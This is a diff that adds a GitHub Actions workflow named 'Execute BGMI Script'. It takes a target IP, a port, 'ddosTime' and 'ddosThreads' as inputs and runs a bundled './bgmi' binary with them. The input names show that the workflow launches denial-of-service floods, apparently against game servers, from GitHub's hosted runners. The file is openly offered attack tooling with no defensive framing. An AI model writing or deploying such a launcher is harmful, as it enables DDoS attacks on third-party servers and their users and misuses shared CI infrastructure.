@@ -1,0 +1,36 @@
+# .github/workflows/execute-bgmi.yml
+name: Execute BGMI Script
+
+on:
+  workflow_dispatch:
+    inputs:
+      ip:
+        description: 'Target IP'
+        required: true
+        type: string
+      port:
+        description: 'Port'
+        required: true
+        type: string
+      ddosTime:
+        description: 'Time(s)'
+        required: true
+        type: string
+      ddosThreads:
+        description: 'Threads'
+        required: true
+        type: string
+
+jobs:
+  execute:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v2
+
+    - name: Make script executable
+      run: chmod +x ./bgmi
+
+    - name: Run BGMI script
+      run: ./bgmi ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.ddosTime }} ${{ github.event.inputs.ddosThreads }}
